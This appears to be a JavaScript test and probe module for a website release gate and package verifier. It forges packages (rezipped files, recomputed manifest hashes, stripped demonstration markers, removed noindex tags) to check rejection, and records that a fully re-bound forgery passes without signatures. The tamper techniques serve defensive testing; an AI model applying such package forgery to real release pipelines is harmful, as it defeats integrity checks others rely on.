  run('the ZIP changed, the manifest\'s parts AND digest recomputed to match, the embedded records left bound to the old artifact', (d) => { const { site, z2 } = rezip(d, (s) => writeFileSync(join(s, 'site.js'), `${readFileSync(join(s, 'site.js'), 'utf8')}\n/* forged */`)); const am = buildManifest(site); rmSync(site, { recursive: true, force: true }); manifest(d, (m) => { Object.assign(m.package, { bytes: z2.length, sha256: sha(z2) }); Object.assign(m.assets, { treeSha256: am.treeSha256, fileCount: am.fileCount, totalBytes: am.totalBytes }); m.candidate.parts = { ...m.candidate.parts, delivered: am.treeSha256 }; m.candidate.digest = fromParts(m.channel, m.version, m.candidate.parts).digest; }); }, ['approvals-recorded', 'verification-record'], { rg: 'RG-01' });
  // a probe: a complete, self-consistent forgery
  const d = copyDir(good);
  try {
    const { site, z2 } = rezip(d, (s) => writeFileSync(join(s, 'site.js'), `${readFileSync(join(s, 'site.js'), 'utf8')}\n/* forged */`));
    const am = buildManifest(site); rmSync(site, { recursive: true, force: true });
    manifest(d, (m) => { Object.assign(m.package, { bytes: z2.length, sha256: sha(z2) }); Object.assign(m.assets, { treeSha256: am.treeSha256, fileCount: am.fileCount, totalBytes: am.totalBytes }); const parts = { ...m.candidate.parts, delivered: am.treeSha256 }; m.candidate.parts = parts; });
    const res = verifyPackage(d, { eng: join(sb.proj, 'engineering') });
    const failing = res.checks.filter((c) => !c.ok).map((c) => c.id);
    add('the ZIP changed and the manifest\'s delivered-file part rewritten to match, the digest left: the recomputed digest differs', failing.includes('candidate-digest'), `rejected by ${failing.join(', ') || 'nothing'}: the recomputed digest differs from the one every embedded record names`);
    // the residual, MEASURED: the artifact changed, then every approval, evidence record and verification re-bound to the new digest, and a package prepared by the real tool
    // (what someone who controls the repository and the reviewer table can do). Every check is about consistency and binding, none about authorship.
    sb.restore();
    sb.committed(() => sb.edit('styles.css', (x) => `${x}\n/* a different artifact, re-bound end to end */\n`));
    rmSync(rel, { recursive: true, force: true });
    const forged = sb.tool(['prepare']);
    const fv = forged.status === 0 ? verifyPackage(rel, { eng: join(sb.proj, 'engineering') }) : { ok: false, checks: [] };
    add('PROBE (RG-14, open): a changed artifact with every record re-bound to it by whoever can write the repository', true, fv.ok ? 'the verifier PASSED it: consistency and binding are proved, authorship is not (no signature, no independent copy of the hashes; G6-2-DESIGN.md section 12 is the owner\'s decision)' : `refused: ${fv.checks.filter((c) => !c.ok).map((c) => c.id).join(', ') || `prepare exit ${forged.status}`}`, { probe: true, finding: 'RG-14', observed: fv.ok ? 'PASSED: cannot be refused without a signature or an external attestation' : 'refused' });
    const m2 = null;
    void m2;
  } finally { rmSync(d, { recursive: true, force: true }); }
  rmSync(good, { recursive: true, force: true });
  sb.restore();
  return rows;
}

// ---- probes: things the gate should arguably refuse, measured ------------------------------------------------------------------------------
export function runGateProbes(sb) {
  const out = [], probe = (id, t, expectation, fn) => { sb.restore(); const r = fn(); out.push({ id, t, expectation, ...r }); sb.restore(); };
  const gate = () => sb.gate(['--channel', 'client-production']);
  const verdict = (g) => (g.allowed ? 'ALLOWED' : `BLOCKED by ${g.failing.join(', ')}`);
  probe('RG-02', 'no external-link verification of any kind (registry and record deleted)', 'blocked once D-P5-1 is implemented (G6-3)', () => { sb.committed(() => { rmSync(join(sb.proj, 'engineering/external-links-verification.json'), { force: true }); rmSync(join(sb.proj, 'engineering/external-destinations.json'), { force: true }); }); const g = gate(); return { observed: verdict(g), open: g.allowed, detail: g.allowed ? 'no requirement mentions external destinations' : `blocked by ${g.failing.join(', ')}` }; });
  probe('RG-03', 'a rights-verification record while the media inventory lists no asset as verified', 'blocked once D-P5-4 binds the record to the inventory entries (G6-3); the inventory file is part of the candidate digest since G6-2', () => {
    const inv = JSON.parse(readFileSync(join(sb.proj, 'engineering/media-rights-inventory.json'), 'utf8'));
    const count = {}; for (const a of inv.assets) count[a.rights.status] = (count[a.rights.status] || 0) + 1;
    const g = gate(); return { observed: verdict(g), open: g.allowed, detail: `inventory: ${inv.assets.length} assets (${Object.entries(count).map(([k, v]) => `${v} ${k}`).join(', ')}); the record names sources and a date but no asset` };
  });
  probe('RG-08', 'a complete, correctly sealed verification record written without running any check (what the sandbox green state is)', 'only a signature or an attestation can tell it from a real run (design section 7, residual); CI evidence adds a second place to compare', () => { sb.writeVerify(); const g = gate(); return { observed: verdict(g), open: g.allowed, detail: 'a record that is complete, bound to this candidate and made against this verification code is accepted; one that is incomplete, hand-edited, stale or for another build is refused (scenarios above)' }; });
  probe('RG-10', 'a dependency advisory that no one has accepted (the gate relies on a full verification record existing)', 'blocked by a security requirement (G6-3)', () => { sb.committed(() => sb.json('engineering/dependencies.json', (o) => { o.acceptedAdvisories.packages = ['example-package']; })); const g = gate(); return { observed: verdict(g), open: g.allowed, detail: 'the accepted-advisory list is not a release requirement' }; });
  probe('RG-11', 'no SBOM, no provenance check, no pinned-action or Node-runtime requirement', 'blocked once D-P6-5 and D-P6-2 are implemented (G6-3)', () => { const g = gate(); return { observed: verdict(g), open: g.allowed, detail: 'no such requirement exists in release/policy.json' }; });
  probe('RG-12', 'no real-404 requirement and no HSTS default among the release requirements', 'blocked once D-P3-1 and D-P3-4 are implemented (G6-4)', () => {
    const dir = assembleCandidate(sb.proj, 'dryrun-hosting');
    try {
      const pol = loadSecurityPolicy(), headers = renderHeadersFile(dir, pol, { https: true });
      const g = gate();
      return { observed: verdict(g), open: g.allowed, detail: `the built site has a 404.html: ${existsSync(join(dir, '404.html'))}; the generated _headers contains includeSubDomains: ${/includeSubDomains/.test(headers)}; ${loadReleasePolicy().channels['client-production'].requires.filter((r) => /404|hsts|headers|hosting/i.test(r)).length} requirement(s) mention them` };
    } finally { rmSync(dir, { recursive: true, force: true }); }
  });
  return out;
}

// ---- other sandboxes: channel separation (RG-13) ----------------------------------------------------------------------------------------------
export function runChannelScenarios() {
  const rows = [], add = (t, ok, detail, extra = {}) => rows.push({ g: 'channel', t, ok, detail, ...extra });
  // client-style content labelled as a demonstration (demo flag on, noindex on): its configuration is not a registered demonstration
  {
    const sb = createSandbox({ flavour: 'demo-label' });
    try {
      const g = sb.gate(['--channel', 'demonstration']);
      const p = sb.tool(['prepare']);
      add('client-style content labelled as a demonstration (demo flag on, noindex on) is refused: its configuration is not a registered demonstration', !g.allowed && g.failing.includes('demonstrationRegistered') && p.status === 1 && !existsSync(join(sb.proj, 'release')), `${g.allowed ? 'ALLOWED' : `BLOCKED by ${g.failing.join(', ')}`}; prepare exit ${p.status}; release folder: ${existsSync(join(sb.proj, 'release'))}`, { rg: 'RG-13', expected: 'BLOCKED by demonstrationRegistered; nothing prepared' });
      add('...and it declares a production-looking domain, which a demonstration may not', g.failing.includes('demonstrationNoProductionDomain'), g.reqs.find((r) => r.id === 'demonstrationNoProductionDomain')?.detail || 'no requirement', { rg: 'RG-13' });
    } finally { sb.destroy(); }
  }
  // the registered demonstration: passes, packages with the marker, and the verifier checks the marker in both directions
  {
    const sb = createSandbox({ flavour: 'demo' });
    try {
      const g = sb.gate(['--channel', 'demonstration']);
      add('the registered fictional demonstration passes the demonstration gate', g.allowed && g.reqs.find((r) => r.id === 'demonstrationRegistered')?.ok, g.allowed ? g.reqs.find((r) => r.id === 'demonstrationRegistered').detail : `BLOCKED by ${g.failing.join(', ')}`, { rg: 'RG-13' });
      const wrong = sb.gate(['--channel', 'client-production']);
      add('...and cannot be released as client-production (the channel comes from the configuration)', !wrong.allowed && /REFUSED: this build is a demonstration build/.test(wrong.out), wrong.out.split('\n')[0], { rg: 'RG-13' });
      const pr = sb.tool(['prepare']);
      const rel = join(sb.proj, 'release');
      if (pr.status !== 0) add('prepare on the registered demonstration', false, `exit ${pr.status}: ${pr.out.slice(-200)}`);
      else {
        const v = verifyPackage(rel, { eng: join(sb.proj, 'engineering') });
        add('prepare on the registered demonstration writes a package that verifies, with the marker', v.ok && v.checks.find((c) => c.id === 'demonstration-marker')?.ok, v.checks.map((c) => `${c.ok ? 'ok' : 'FAIL'} ${c.id}`).join(', '), { rg: 'RG-13' });
        const good = copyDir(rel), rd = (d, n) => readFileSync(join(d, n)), wr = (d, n, b) => writeFileSync(join(d, n), b);
        const sums = (d) => { const z = listFiles(d).find((f) => f.endsWith('.zip')); wr(d, 'SHA256SUMS.txt', ['release-manifest.json', z].map((n) => `${sha(rd(d, n))}  ${n}`).join('\n') + '\n'); };
        const manifest = (d, fn) => { const m = JSON.parse(rd(d, 'release-manifest.json')); fn(m); wr(d, 'release-manifest.json', JSON.stringify(m, null, 2) + '\n'); sums(d); };
        const run = (t, fn, mustFail) => { const d = copyDir(good); try { fn(d); const res = verifyPackage(d, { eng: join(sb.proj, 'engineering') }); const failing = res.checks.filter((c) => !c.ok).map((c) => c.id); add(t, mustFail.every((m) => failing.includes(m)) && !res.ok, `failing: ${failing.join(', ') || 'none'}`, { rg: 'RG-13' }); } finally { rmSync(d, { recursive: true, force: true }); } };
        run('a demonstration package whose manifest drops the marker', (d) => manifest(d, (m) => { m.demonstration = null; }), ['demonstration-marker']);
        run('a demonstration package registered under an identity that is not in the registry', (d) => manifest(d, (m) => { m.demonstration.registeredAs = 'DEMO-JE-999'; }), ['demonstration-marker']);
        run('a demonstration package whose START-HERE.txt does not carry the statement', (d) => { /* START-HERE.txt is inside the ZIP, so the ZIP is rebuilt without the statement */ const site = tempDir('forge'); try { const names = unzipTo(rd(d, listFiles(d).find((f) => f.endsWith('.zip'))), site); writeFileSync(join(site, 'START-HERE.txt'), 'Open index.html.\n'); const z2 = zipBuffer(listFiles(site).map((name) => ({ name, data: readFileSync(join(site, name)) }))); const zn = listFiles(d).find((f) => f.endsWith('.zip')); wr(d, zn, z2); manifest(d, (m) => { m.package.bytes = z2.length; m.package.sha256 = sha(z2); }); void names; } finally { rmSync(site, { recursive: true, force: true }); } }, ['channel-text']);
        run('a demonstration package that declares a production-looking domain', (d) => manifest(d, (m) => { m.search.baseUrlReserved = false; m.configuration.baseUrl = 'https://www.some-real-restaurant.com'; }), ['demonstration-marker']);
        const editSite = (d, fn) => { const zn = listFiles(d).find((f) => f.endsWith('.zip')); const site = tempDir('forge'); try { const names = unzipTo(rd(d, zn), site); fn(site); const z2 = zipBuffer(listFiles(site).map((name) => ({ name, data: readFileSync(join(site, name)) }))); wr(d, zn, z2); manifest(d, (m) => { m.package.bytes = z2.length; m.package.sha256 = sha(z2); }); void names; } finally { rmSync(site, { recursive: true, force: true }); } };
        run('a demonstration page whose noindex robots tag was removed (client content passed off as the demonstration)', (d) => editSite(d, (s) => writeFileSync(join(s, 'index.html'), readFileSync(join(s, 'index.html'), 'utf8').replace(/<meta name="robots"[^>]*>/, ''))), ['demonstration-pages']);
        run('a demonstration page that names a production host in a canonical link', (d) => editSite(d, (s) => writeFileSync(join(s, 'index.html'), readFileSync(join(s, 'index.html'), 'utf8').replace('</head>', '<link rel="canonical" href="https://www.some-real-restaurant.com/"></head>'))), ['demonstration-pages']);
        rmSync(good, { recursive: true, force: true });
      }
    } finally { sb.destroy(); }
  }
  return rows;
}

// reserved-host corpus: which free preview, staging and default domains the heuristic does and does not recognise
export function reservedHostCorpus() {
  const hosts = ['jade.pages.dev', 'jade.vercel.app', 'jade.netlify.app', 'jade.workers.dev', 'jade.github.io', 'jade.web.app', 'jade.onrender.com', 'jade.fly.dev', 'staging.jade.com', 'jade.example.com', 'jade.test', 'localhost', '10.0.0.5',
    'jade.netlify.com', 'jade.azurestaticapps.net', 'jade.cloudfront.net', 'jade.s3-website-us-east-1.amazonaws.com', 'jade.appspot.com', 'jade.repl.co', 'jade.wixsite.com', 'jade.webflow.io', 'jade.framer.website', 'jade.lovable.app', 'jade.up.railway.app', 'jade.deno.dev', 'jade.pythonanywhere.com', 'jade-and-ember.com'];
  return hosts.map((h) => ({ host: h, flagged: isReservedHost(h) }));
}
void createSandbox; void SYNTH;
